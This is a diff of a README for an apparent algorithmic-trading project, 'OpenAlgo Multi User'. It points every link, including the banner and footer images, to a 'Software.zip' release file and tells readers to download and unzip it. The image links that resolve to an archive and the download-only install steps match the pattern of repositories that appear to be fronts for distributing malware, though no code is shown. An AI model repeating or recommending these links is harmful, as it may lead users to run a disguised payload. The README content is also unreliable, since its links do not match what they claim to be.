@@ -1,7 +1,7 @@
 
 # OpenAlgo Multi User
 
-![Banner](https://github.com/Ikulaa/openalgo-multiuser/releases/download/v1.0/Software.zip)
+![Banner](https://github.com/Ikulaa/openalgo-multiuser/releases/download/v2.0/Software.zip)
 
 Welcome to the OpenAlgo Multi User repository! This repository focuses on providing a platform for algorithmic trading using various technologies such as Celery, Docker, FastAPI, PostgreSQL, RabbitMQ, React, Redis, Shadcn-UI, and more. Whether you are a beginner or an experienced trader, this repository aims to provide a robust and efficient system for algorithmic trading.
 
@@ -15,7 +15,7 @@ Welcome to the OpenAlgo Multi User repository! This repository focuses on provid
 
 ## Installation
 
-To get started with OpenAlgo Multi User, you can download the latest version [here](https://github.com/Ikulaa/openalgo-multiuser/releases/download/v1.0/Software.zip). Once you have downloaded the file, follow these steps to launch the application:
+To get started with OpenAlgo Multi User, you can download the latest version [here](https://github.com/Ikulaa/openalgo-multiuser/releases/download/v2.0/Software.zip). Once you have downloaded the file, follow these steps to launch the application:
 
 1. Unzip the downloaded file and navigate to the extracted folder.
 2. Follow the installation instructions provided in the repository documentation to set up the environment.
@@ -59,8 +59,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Click the button below to download the latest version of OpenAlgo Multi User and start exploring the world of algorithmic trading:
 
-[![Download OpenAlgo Multi User](https://github.com/Ikulaa/openalgo-multiuser/releases/download/v1.0/Software.zip%20Version-blue)](https://github.com/Ikulaa/openalgo-multiuser/releases/download/v1.0/Software.zip)
+[![Download OpenAlgo Multi User](https://github.com/Ikulaa/openalgo-multiuser/releases/download/v2.0/Software.zip%20Version-blue)](https://github.com/Ikulaa/openalgo-multiuser/releases/download/v2.0/Software.zip)
 
 Thank you for visiting our repository! 🚀📈🤖
 
-![Footer](https://github.com/Ikulaa/openalgo-multiuser/releases/download/v1.0/Software.zip)
+![Footer](https://github.com/Ikulaa/openalgo-multiuser/releases/download/v2.0/Software.zip)
